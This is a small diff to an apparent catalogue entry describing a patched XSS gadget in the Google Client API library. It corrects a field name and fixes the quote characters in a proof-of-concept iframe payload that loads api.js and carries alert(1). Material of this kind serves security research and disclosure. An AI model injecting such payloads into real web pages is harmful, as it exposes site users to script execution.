@@ -3,9 +3,9 @@
 ### Meta
 
 + Library: Google Client API
-+ Starts: N/A
++ Stars: 3.2K
 + Version: 5BIk7BglYEE
-+ Payload: ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>```
++ Payload: ```<iframe name="scripts" src="https://apis.google.com/js/api.js"></iframe><iframe name="scripts" src="https://apis.google.com/js/api.js">alert(1)</iframe>```
 + Impact: XSS
 + CVE: N/A
 + Status: Patched
